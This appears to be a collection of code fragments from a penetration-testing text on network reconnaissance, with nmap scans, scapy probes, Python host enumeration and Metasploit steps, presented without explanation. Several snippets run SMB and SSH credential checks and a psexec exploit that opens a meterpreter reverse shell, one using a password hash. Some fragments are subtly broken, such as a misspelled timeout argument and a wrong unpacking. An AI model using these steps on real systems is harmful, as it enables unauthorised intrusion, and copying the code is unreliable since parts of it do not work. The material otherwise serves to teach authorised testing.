["```py\nnmap -sS -vvv -p 80 192.168.195.0/24\n\n```", "```py\nnmap -sS -vvv -p 80 -iL nmap_subnet_file\n\n```", "```py\nnmap -sT -vvv -p 80 192.168.195.0/24\n\n```", "```py\nnmap -sS -vvv -p 80 192.168.195.0/24\n\n```", "```py\nnmap -sA -vvv -p80 192.168.195.0/24\n\n```", "```py\nnmap -sU -vvv -p161 192.168.195.0/24\n\n```", "```py\nnmap -sS -sU -vvv -p U:161,139 T:8080,21 192.168.195.0/24\n\n```", "```py\ncat nmap_scan.gnmap | grep 445/open/tcp | cut -d\" \" -f2 >> /root/Desktop/smb_hosts_list\n\n```", "```py\nHost: 192.168.195.112 () Ports: 445/open/tcp/\n\n```", "```py\nmsfconsole\n\n```", "```py\nmsfpro\n\n```", "```py\nuse auxiliary/scanner/smb/smb_login\nset SMBUser administrator\nset SMBPass test\nset SMBDomain Workgroup\nset RHOSTS file:/root/Desktop/smb_hosts_list\nrun\n\n```", "```py\nmsfconsole\nuse exploit/windows/smb/psexec\nset SMBUser administrator\nset SMBPass test\nset SMBDomain Workgroup\nset payload windows/meterpreter/reverse_tcp\nset RHOST 192.168.195.112\nset LPORT 443\nexploit -j\n\n```", "```py\nmsfconsole\nuse auxiliary/scanner/smb/smb_login\nset SMBUser administrator\nset SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537\nset SMBDomain Workgroup\nset RHOSTS file:/root/Desktop/smb_hosts_list\nrun\n\n```", "```py\nmsfconsole\nuse exploit/windows/smb/psexec\nset SMBUser administrator\nset SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537\nset SMBDomain Workgroup\nset payload windows/meterpreter/reverse_tcp\nset RHOST 192.168.195.112\nset LPORT 443\nexploit -j\n\n```", "```py\nnmap --script \"(default or safe) and not http-*\" <target IP>\n\n```", "```py\nfor i in `seq 1 255`; do ping -c 1 192.168.$1.1 | tr \\\\n ' ' | awk '/1 received/ {print $2}'; done\n\n```", "```py\ndef get_interfaces():\n    interfaces = netifaces.interfaces()\n    return interfaces\n```", "```py\ndef get_gateways():\n    gateway_dict = {}\n    gws = netifaces.gateways()\n    for gw in gws:\n        try:\n            gateway_iface = gws[gw][netifaces.AF_INET]\n            gateway_ip, iface = gateway_iface[0], gateway_iface[1]\n            gw_list =[gateway_ip, iface]\n            gateway_dict[gw]=gw_list\n        except:\n            pass\n    return gateway_dict\n```", "```py\ndef get_addresses(interface):\n    addrs = netifaces.ifaddresses(interface)\n    link_addr = addrs[netifaces.AF_LINK]\n    iface_addrs = addrs[netifaces.AF_INET]\n    iface_dict = iface_addrs[0]\n    link_dict = link_addr[0]\n    hwaddr = link_dict.get('addr')\n    iface_addr = iface_dict.get('addr')\n    iface_broadcast = iface_dict.get('broadcast')\n    iface_netmask = iface_dict.get('netmask')\n    return hwaddr, iface_addr, iface_broadcast, iface_netmask\n```", "```py\ndef get_networks(gateways_dict):\n    networks_dict = {}\n    for key, value in gateways.iteritems():\n        gateway_ip, iface = value[0], value[1]\n        hwaddress, addr, broadcast, netmask  = get_addresses(iface)\n        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, \n          'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}\n        networks_dict[iface] = network\n    return networks_dict\n```", "```py\nimport sys\ntry:\n    import nmap\nexcept:\n    sys.exit(\"[!] Install the nmap library: pip install python-nmap\")\n```", "```py\n# Argument Validator\nif len(sys.argv) != 3:\n    sys.exit(\"Please provide two arguments the first being the targets the second the ports\")\nports = str(sys.argv[2])\naddrs = str(sys.argv[1])\n```", "```py\nscanner = nmap.PortScanner()\nscanner.scan(addrs, ports)\nfor host in scanner.all_hosts():\n    if not scanner[host].hostname():\n        print(\"The host's IP address is %s and it's hostname was not found\") % (host)\n    else:\n        print(\"The host's IP address is %s and it's hostname is %s\") % (host, scanner[host].hostname())\n```", "```py\n# Argument Validator\nif len(sys.argv) != 5:\n    sys.exit(\"[!] Please provide four arguments the first being the targets the second the ports, the third the username, and the fourth the password\")\npassword = str(sys.argv[4])\nusername = str(sys.argv[3])\nports = str(sys.argv[2])\nhosts = str(sys.argv[1])\n```", "```py\ndef resource_file_builder(dir, user, passwd, ips, port_num, hosts_file):\n    ssh_login_rc = \"%s/ssh_login.rc\" % (dir)\n    bufsize=0\n    set_module = \"use auxiliary/scanner/ssh/ssh_login \\n\"\n    set_user = \"set username \" + username + \"\\n\"\n    set_pass = \"set password \" + password + \"\\n\"\n    set_rhosts = \"set rhosts file:\" + hosts_file + \"\\n\"\n    set_rport = \"set rport\" + ports + \"\\n\"\n    execute = \"run\\n\"\n    f = open(ssh_login_rc, 'w', bufsize)\n    f.write(set_module)\n    f.write(set_user)\n    f.write(set_pass)\n    f.write(set_rhosts)\n    f.write(execute)\n    f.closed\n```", "```py\ndef target_identifier(dir,user,passwd,ips,port_num,ifaces):\n    bufsize = 0\n    ssh_hosts = \"%s/ssh_hosts\" % (dir)\n    scanner = nmap.PortScanner()\n    scanner.scan(ips, port_num)\n    open(ssh_hosts, 'w').close()\n    if scanner.all_hosts():\n        e = open(ssh_hosts, 'a', bufsize)\n    else:\n        sys.exit(\"[!] No viable targets were found!\")\n    for host in scanner.all_hosts():\n        for k,v in ifaces.iteritems():\n            if v['addr'] == host:\n                print(\"[-] Removing %s from target list since it \n                    belongs to your interface!\") % (host)\n                host = None\n        if host != None:\n            home_dir=\"/root\"\n            ssh_hosts = \"%s/ssh_hosts\" % (home_dir)\n            bufsize=0\n            e = open(ssh_hosts, 'a', bufsize)\n            if 'ssh' in scanner[host]['tcp'][int(port_num)]['name']:\n                if 'open' in scanner[host]['tcp'][int(port_num)]['state']:\n                    print(\"[+] Adding host %s to %s since the service is active on %s\") % \n                        (host,ssh_hosts,port_num)\n                    hostdata=host + \"\\n\"\n                    e.write(hostdata)\n    if not scanner.all_hosts():\n        e.closed\n    if ssh_hosts:\n        return ssh_hosts\n```", "```py\nhome_dir=\"/root\"\ngateways = {}\nnetwork_ifaces={}\n```", "```py\nif __name__ == '__main__':\n    gateways = get_gateways()\n    network_ifaces = get_networks(gateways)\n    hosts_file = target_identifier(home_dir,username,\n      password,hosts,ports,network_ifaces)\n    resource_file_builder(home_dir, username, \n      password, hosts, ports, hosts_file)\n```", "```py\nif __name__ == '__main__':\n    main()\n```", "```py\n#!/usr/bin/env python\ntry:\n    from scapy.all import *\nexcept:\n    sys.exit(\"[!] Install the scapy libraries with: pip install \n      scapy\")\nip = \"192.168.195.2\"\nicmp = IP(dst=ip)/ICMP()\nresp = sr1(icmp, timout=10)\n```", "```py\nif resp == None:\n    print(\"The host is down\")\nelse:\n    print(\"The host is up\")\n```", "```py\nanswers,unanswers = sr1(icmp, timout=10)\n```", "```py\nsent, received = answers[80]\n```", "```py\n#!/usr/bin/env python\nfrom scapy.all import *\nip = \"192.168.195.1\"\ndst_port = 80\nheaders=IP(dst=ip)/TCP(dport=dst_port, flags=\"S\")\nanswers,unanswers=sr(headers,timeout=10)\n\n```", "```py\nfor a in answers:\n    print(a[1][1].flags)\n```"]